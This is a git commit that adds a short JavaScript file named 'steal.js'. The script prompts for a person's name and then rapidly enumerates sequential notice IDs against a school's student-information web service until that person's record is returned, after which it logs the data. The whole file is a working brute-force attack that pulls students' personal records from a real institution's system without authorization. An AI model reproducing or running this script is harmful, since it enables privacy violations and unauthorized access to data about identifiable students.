207949dd3a32aa0aa8c3c5c8b4d85f9835c61fc1
Misaka10049 <87744356+Misaka10049@users.noreply.github.com>
2023-07-03 23:09:20 +0800

    Add files via upload

---
+++ steal.js
@@ -0,0 +1,23 @@
+﻿loop=1000
+stu=prompt("请输入你要查询的人名：")
+while(!confirm("查询对象为："+stu+"\n\n请确认！"))
+  stu=prompt("请输入你要查询的人名：")
+api="https://oa.cqyz.cn/Web Services/student.asmx/NewStudents_Get2"
+obj={name:stu,noticeId:""}
+function post(){
+  loop++
+  obj.noticeId="HB"+String(loop)
+  console.log("正在对比"+obj.noticeId)
+	Ajax.jQuery({
+	url: api,
+	params: obj,
+	fn: function(res){
+	  if(res.type!=null){
+		clearInterval(ticker)
+		console.log("查询完成！用时："+String(new Date()-start)+"ms")
+		console.log(res)
+	  }
+  }})
+}
+start=new Date()
+ticker=setInterval(post)
